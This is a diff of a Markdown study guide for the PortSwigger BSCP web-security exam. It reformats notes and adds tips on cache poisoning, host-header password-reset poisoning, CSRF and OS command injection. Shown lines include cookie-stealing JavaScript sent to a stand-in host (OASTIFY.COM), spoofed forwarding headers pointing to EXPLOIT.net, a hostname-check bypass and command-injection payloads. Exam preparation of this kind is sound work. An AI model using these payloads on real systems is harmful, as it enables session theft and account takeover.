@@ -1023,8 +1023,12 @@ alert(document.getElementsByClassName("navbar-brand")[0].innerText)
 
 ### Unkeyed header  
 
->Target use **tracking.js** JavaScript, and is vulnerable to **```X-Forwarded-Host```** or **```X-Host```** header redirecting path, allowing the stealing of cookie by poisoning cache.
->***Identify*** the web cache headers in response and the tracking.js script in the page source code. Exploit the vulnerability by hosting JavaScript and injecting the header to poison the cache of the target to redirect a victim visiting.  
+>Target use **tracking.js** JavaScript,  
+>and is vulnerable to **```X-Forwarded-Host```** or **```X-Host```** header redirecting path,  
+>allowing the stealing of cookie by poisoning cache.  
+
+>***Identify*** the web cache headers in response and the tracking.js script in the page source code.  
+>Exploit the vulnerability by hosting JavaScript and injecting the header to poison the cache of the target to redirect a victim visiting.  
 
 ![Tracking `source code` review](images/tracking-code-review.png)  
   
@@ -1125,7 +1129,9 @@ document.location='https://OASTIFY.COM/?CacheCookies='+document.cookie;
 
 ### Cache Poison multiple headers  
 
->Identify that cache hit headers in responses, then test if the target support ```X-Forwarded-Host``` or ```X-Forwarded-Scheme``` headers. These headers can allow for the stealing of victim session cookie.  
+>Identify that cache hit headers in responses,  
+>then test if the target support ```X-Forwarded-Host``` or ```X-Forwarded-Scheme``` headers.  
+>These headers can allow for the stealing of victim session cookie.  
   
 >Identify if adding the two **Forwarded** headers to the GET ```/resources/js/tracking.js``` request, result in a change to the location response header. This ***identify*** positive poisoning of the cache with multiple headers.  
 
@@ -1138,7 +1144,9 @@ X-Forwarded-Scheme: nothttps
 
 ![x-forwarded-scheme not https](images/x-forwarded-scheme-nohttps.png)  
 
->On the exploit server change the file path to ```/resources/js/tracking.js``` and the update the poison request ```X-Forwarded-Host: EXPLOIT.net``` header. Place the payload on exploit server body.  
+>On the exploit server change the file path to ```/resources/js/tracking.js```  
+>and then update the poison request ```X-Forwarded-Host: EXPLOIT.net``` header.  
+>Place the payload on exploit server body.  
 
 ```html
 document.location='https://OASTIFY.COM/?poisoncache='+document.cookie;
@@ -1177,7 +1185,9 @@ GET /js/geolocate.js?callback=setCountryCookie&callback=FUZZERFunction; HTTP/2
 
 ### Spoof IP Address  
 
->***Identify*** that altered HOST headers are supported, which allows you to spoof your IP address and bypass the IP-based brute-force protection or redirection attacks to do password reset poisoning.  
+>***Identify*** that altered HOST headers are supported,  
+>which allows you to spoof your IP address and bypass the IP-based brute-force protection  
+>or redirection attacks to do ***password reset*** poisoning.  
   
 >Include the below `X- ` headers and change the username parameter on the password reset request to `Carlos` before sending the request.  
 >In the BSCP exam if you used this exploit then it means you have not used a vulnerability that require user interaction and allow you to use an interaction vulnerability to gain access to stage 3 as admin by using exploit server `Deliver exploit to victim` function.  
@@ -1188,8 +1198,12 @@ X-Host: EXPLOIT.net
 X-Forwarded-Server: EXPLOIT.net
 ```  
 
+>Tips & Notes from ***fullfox***:  
+
+* When spoofing host header on password reset using `Host:` or `X-Forwarded-Host:`, if you receive the error `Invalid hostname`, try using the following hostname: `xxx.oastify.com?TARGET.net` legit target URL without a slash.  
+
 >Check the exploit server log to obtain the reset link to the victim username.  
-  
+
 ![Exploit Server Logs capture the forgot password reset token](images/HOST-Header-forgot-password-reset.PNG)  
 
 [PortSwigger Lab: Password reset poisoning via middle-ware](https://portswigger.net/web-security/authentication/other-mechanisms/lab-password-reset-poisoning-via-middleware)  
@@ -1822,7 +1836,9 @@ history.pushState('', '', '/');
 
 ### Is Logged In  
   
->If cookie with the **isloggedin** name is ***identified***, then a refresh of admin password POST request could be exploited. Change username parameter to administrator while logged in as low privilege user, CSRF where token is not tied to user session.  
+>If cookie with the **isloggedin** name is ***identified***, then a refresh of admin password POST request could be exploited.  
+>Change username parameter to administrator while logged in as low privilege user.  
+>CSRF token is not tied to user session.  
 
 ```html
 POST /refreshpassword HTTP/1.1
@@ -1836,8 +1852,8 @@ Sec-Ch-Ua-Platform: "Linux"
 Upgrade-Insecure-Requests: 1
 Origin: https://TARGET.net
 Content-Type: application/x-www-form-urlencoded
-User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5414.75 Safari/537.36
-Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;
 X-Forwarded-Host: EXPLOIT.net
 X-Host: EXPLOIT.net
 X-Forwarded-Server: EXPLOIT.net
@@ -3831,7 +3847,6 @@ echo $cookie;
 
 + [Feedback](#feedback)  
 + [Output redirection](#output-redirection)  
-+ [HackTheBox Academy CPTS OS Command Injection](https://github.com/botesjuan/cpts-quick-references/blob/main/module/command%20injection.md)  
 
 ### Feedback  
 
@@ -3911,6 +3926,10 @@ GET /image?filename=output.txt HTTP/2
 | ping -c 5 exploit.net
 `ls`
 ```  
+
+>Tip from ***fullfox***:  
+
+* If you can inject in an XML file and you can't find a way to perform an XXE, think about OS command injection using $() or backticks.
 
 -----
 
